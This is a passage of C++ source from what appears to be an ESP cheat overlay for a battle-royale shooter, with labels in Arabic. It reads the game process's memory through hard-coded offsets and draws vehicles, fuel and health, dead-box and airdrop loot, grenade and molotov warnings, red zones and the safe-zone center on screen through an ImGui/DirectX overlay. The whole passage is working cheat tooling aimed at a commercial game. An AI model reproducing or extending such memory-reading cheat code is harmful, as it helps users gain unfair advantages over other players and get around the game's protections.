												if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"ﺔﻨﻴﻔﺳ")
												{
													if (Setting::vahicle_Text_item_PG117_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"ﺏﺭﺎﻗ")
												{
													if (Setting::vahicle_Text_item_Aquarail_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"ﺓﺮﻴﺒﻛ ﺔﻨﺣﺎﺷ")
												{
													if (Setting::vahicle_Text_item_BigFoot_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
													}
													continue;
												}
											}

										}
									}
								}
							}
							if (Setting::Esp_Item_DeadBox)
							{

								ImColor color;

								if (Data::BoxesList.size() != 0)
								{
									TempBoxesList.clear();
									TempBoxesList = Data::BoxesList;
								}
								for (Deadbox Box : TempBoxesList)
								{

									if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Box.Position, Screen, &Distance, ViewMatrix)) continue;

									if (Distance < 8)
									{
										continue;
									}
									std::string dead = (Box.Name) + u8"[ﺮﺘﻣ" + to_string(Distance) + u8"]";
									if (Box.IsDeadBox)
									{
										if (Distance > 100)
										{
											continue;
										}
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DeadBox_TextSize, dead, Screen.X + 16, Screen.Y + 13, ImColor(Setting::Esp_Item_DeadBox_Color[0], Setting::Esp_Item_DeadBox_Color[1], Setting::Esp_Item_DeadBox_Color[2], Setting::Esp_Item_DeadBox_Color[3]), false);
										if (Setting::Esp_Item_DeadBox_Icon)
										{
											if (Setting::Weapon_Icon_With_BG)
											{
												DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y + 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
												DX11::ImGui_DX11::DrawImage(DX11::DeadBox, Screen.X - 50, Screen.Y - 15, 40, 40);
											}
											else
											{
												DX11::ImGui_DX11::DrawImage(DX11::DeadBox, Screen.X - 50, Screen.Y - 15, 40, 40);
											}
										}
									}



									if (Setting::Esp_Item_DeadBox)
									{
										float yOffset{ -18.0f };
										for (int k = 0; k < Box.boxitem.size(); k++)
										{
											color = Box.boxitem[k].colorcod;
											std::string text = Box.boxitem[k].Displayname;
											DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, text, Screen.X + 16, Screen.Y + 15 + (yOffset), Box.boxitem[k].colorcod, false);
											yOffset -= 18.0f;

										}

									}

								}


							}
							if (Setting::Esp_Item_AirDrop)
							{

								ImColor color;

								if (Data::BoxesList.size() != 0)
								{
									TempBoxesList.clear();
									TempBoxesList = Data::BoxesList;
								}
								for (Deadbox Box : TempBoxesList)
								{

									if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Box.Position, Screen, &Distance, ViewMatrix)) continue;

									if (Distance < 150)
									{
										continue;
									}
									std::string dead = (Box.Name) + u8"[ﺮﺘﻣ" + to_string(Distance) + u8"]";
									if (Box.isAirDrop)
									{
										if (Distance > 350)
										{
											continue;
										}
										if (Setting::Esp_Item_AirDrop_Icon)
										{
											if (Setting::Weapon_Icon_With_BG)
											{
												DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
												DX11::ImGui_DX11::DrawImage(DX11::AirDrop, Screen.X - 50, Screen.Y - 25, 40, 40);
											}
											else
											{
												DX11::ImGui_DX11::DrawImage(DX11::AirDrop, Screen.X - 50, Screen.Y - 25, 40, 40);
											}
										}
										string Dist = "";
										if (Box.bIsAirOpen)
										{
											Dist = u8"ﺏﻭﺭﺩ ﺮﻳﺍ [ﺮﺘﻣ" + to_string(Distance) + u8"] [ﺡﻮﺘﻔﻣ]";

										}
										else
										{
											Dist = u8"ﺏﻭﺭﺩ ﺮﻳﺍ [ﺮﺘﻣ" + to_string(Distance) + u8"]";
										}
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AirDrop_TextSize, Dist, Screen.X - 60, Screen.Y + 15, ImColor(Setting::Esp_Item_AirDrop_Color[0], Setting::Esp_Item_AirDrop_Color[1], Setting::Esp_Item_AirDrop_Color[2], Setting::Esp_Item_AirDrop_Color[3]), false);

									}



									if (Setting::Esp_Item_AirDrop)
									{
										float yOffset{ -18.0f };
										for (int k = 0; k < Box.boxitem.size(); k++)
										{
											color = Box.boxitem[k].colorcod;
											std::string text = Box.boxitem[k].Displayname;
											DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, text, Screen.X + 16, Screen.Y + 15 + (yOffset), Box.boxitem[k].colorcod, false);
											yOffset -= 18.0f;

										}

									}

								}


							}

						}
						if (Setting::BombAlert)
						{
							TempBombAlertList.clear();
							TempBombAlertList = Data::BombAlertList;
							for (BombAlert& bomb : TempBombAlertList) {
								bomb.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(bomb.Address + Offset::RootComponent) + Offset::Position);
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, bomb.Position, Screen, &Distance, ViewMatrix)) continue;
								if (Distance > 210)continue;
								string  Name = bomb.Name + u8" [ﺮﺘﻣ " + to_string(Distance) + "]";
								string  Text1 = bomb.Name;
								const char* Aim;

								ImColor warncolor;
								int randomNum = (rand() % 2) + 1;
								if (randomNum == 1)
								{
									warncolor = DX11::ImGui_DX11::Color::Red;
								}
								if (randomNum == 2)
								{
									warncolor = DX11::ImGui_DX11::Color::White;
								}
								string bombnot = "";
								if (bomb.Name == u8"ﺔﻠﺒﻨﻗ")
								{
									bombnot = u8"<!> ﺭﺬﺣﺍ " + bomb.Name + " " + to_string(Distance) + u8"ﺮﺘﻣ" + " <!>";
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Blue);
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 500.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 600.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Red, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 70 * 22.5f, warncolor, true);
								}
								if (bomb.Name == u8"ﻑﻮﺗﻮﻟﻮﻣ")
								{
									bombnot = u8"<!> ﺭﺬﺣﺍ " + bomb.Name + " " + to_string(Distance) + u8"ﺮﺘﻣ" + " <!>";

									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Red, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}
								if (bomb.Name == u8"ﺵﻼﻓ")
								{
									bombnot = u8"<!> ﺭﺬﺣﺍ " + bomb.Name + " " + to_string(Distance) + u8"ﺮﺘﻣ" + " <!>";

									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Green, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}
								if (bomb.Name == u8"ﻙﻮﻤﺳ")
								{
									bombnot = u8"<!> ﺭﺬﺣﺍ " + bomb.Name + " " + to_string(Distance) + u8"ﺮﺘﻣ" + " <!>";

									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::SmokeGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Green, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}

							}
						}
						if (Setting::redzone)
						{
							TempBombAlertList.clear();
							TempBombAlertList = Data::BombAlertList;
							for (BombAlert& bomb : TempBombAlertList) {
								bomb.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(bomb.Address + Offset::RootComponent) + Offset::Position);
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, bomb.Position, Screen, &Distance, ViewMatrix)) continue;
								if (Distance > 210)continue;
								string  Name = bomb.Name + u8"ﻥﻭﺯ ﺪﻳﺭ [ﺮﺘﻣ " + to_string(Distance) + u8"]";
								const char* Aim;

								if (bomb.Name == "ﻥﻭﺯ ﺪﻳﺭ")
								{
									if (Setting::Esp_Item_RedZone_Icon)
									{

										if (Setting::Weapon_Icon_With_BG)
										{
											DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
											DX11::ImGui_DX11::DrawImage(DX11::redzone, Screen.X - 50, Screen.Y - 25, 40, 40);
										}
										else
										{
											DX11::ImGui_DX11::DrawImage(DX11::redzone, Screen.X - 50, Screen.Y - 25, 40, 40);
										}
									}
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.7f, DX11::ImGui_DX11::Color::Red);
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.7f, DX11::ImGui_DX11::Color::Blue);
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 500.0f, 1.7f, DX11::ImGui_DX11::Color::Green);
									Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 700.0f, 1.7f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_RedZone_TextSize, Name, Screen.X, Screen.Y - 5, ImColor(Setting::Esp_Item_RedZone_Color[0], Setting::Esp_Item_RedZone_Color[1], Setting::Esp_Item_RedZone_Color[2], Setting::Esp_Item_RedZone_Color[3]), true);

								}
							}
						}
						if (Setting::ZoneCenter)
						{
							TempItemList.clear();
							TempItemList = Data::ItemList;
							for (Item& Item : Data::ItemList)
							{
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Item.Position, Screen, &Distance, ViewMatrix)) continue;
								string  Name = Item.Name + " [" + to_string(Distance) + u8"ﺮﺘﻣ]";
								const char* Aim;

								if (Item.Name == u8"ﺔﻨﻣﻻﺍ ﻥﻭﺰﻟﺍ ﺔﻘﻄﻨﻣ")
								{
									DX11::ImGui_DX11::DrawImage(DX11::WhiteArrow, Screen.X - 50, Screen.Y - 60, 40, 40);
									Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, Item.Position, 32, 700.0f, 1.7f, DX11::ImGui_DX11::Color::Green);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_RedZone_TextSize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Green, true);
								}
							}

						}
					}
				}
			}


			ImGui::EndFrame();

			DX11::BeginDraw();
			ImGui::Render();
			ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
			DX11::EndDraw();


			DX11Window::IsDrawing = false;


			DX11Window::IsDrawing = true;
		}
		catch (int e)
		{
			//std::cout << e << std::endl;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(Setting::EspThreadDelay));
	}


}